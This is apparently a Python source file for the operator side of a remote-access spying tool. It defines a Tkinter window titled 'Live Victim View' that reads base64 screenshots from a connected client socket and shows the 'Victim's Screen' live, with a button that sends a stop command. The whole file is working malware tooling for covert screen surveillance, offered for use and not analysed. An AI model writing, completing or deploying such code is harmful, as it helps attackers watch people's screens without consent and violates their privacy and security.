import threading
import tkinter as tk
from PIL import Image, ImageTk
import io
import base64
import socket
class LiveVictimGUI:
    def __init__(self, client_socket):
        self.client = client_socket
        self.running = True
        self.setup()
    def setup(self):
        self.root = tk.Tk()
        self.root.title("Live Victim View - REAL TIME")
        self.root.geometry("900x700")
        self.root.configure(bg="black")
        self.canvas = tk.Canvas(
            self.root,
            bg="black",
            width=850,
            height=600
        )
        self.canvas.pack(pady=10)
        self.status = tk.Label(
            self.root,
            text="LIVE STREAMING - Victim's Screen",
            fg="red",
            bg="black",
            font=("Arial", 12, "bold")
        )
        self.status.pack()
        btn_frame = tk.Frame(self.root, bg="black")
        btn_frame.pack(pady=10)
        self.stop_btn = tk.Button(
            btn_frame,
            text="STOP STREAM",
            command=self.stop_view,
            bg="red",
            fg="white",
            padx=20,
            pady=5,
            font=("Arial", 10, "bold")
        )
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        self.receive_thread = threading.Thread(
            target=self.receive_frames,
            daemon=True
        )
        self.receive_thread.start()
        self.root.protocol("WM_DELETE_WINDOW", self.stop_view)
        self.root.mainloop()
    def receive_frames(self):
        buffer = ""
        while self.running:
            try:
                self.client.settimeout(0.1)
                data = self.client.recv(65536).decode('utf-8', errors='ignore')
                if not data:
                    break
                buffer += data
                while "LIVE_START" in buffer and "LIVE_END" in buffer:
                    start_idx = buffer.find("LIVE_START")
                    end_idx = buffer.find("LIVE_END")
                    if start_idx != -1 and end_idx != -1 and end_idx > start_idx:
                        img_part = buffer[start_idx + 11:end_idx]
                        buffer = buffer[end_idx + 9:]  # Remove processed part
                        try:
                            img_data = base64.b64decode(img_part)
                            image = Image.open(io.BytesIO(img_data))
                            image = image.resize((850, 600), Image.Resampling.LANCZOS)
                            photo = ImageTk.PhotoImage(image)
                            self.root.after(0, self.update_image, photo)
                        except Exception as e:
                            print(f"[DEBUG] Image decode error: {e}")
                            continue
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"[ERROR] Receive failed: {e}")
                break
        if self.running:
            self.root.after(0, self.stop_view)
    def update_image(self, photo):
        try:
            self.canvas.delete("all")
            self.canvas.create_image(425, 300, image=photo, anchor='center')
            self.canvas.image = photo  # Keep reference
        except:
            pass
    def stop_view(self):
        self.running = False
        try:
            self.client.send(b"stop\n")
        except:
            pass
        try:
            self.root.destroy()
        except:
            pass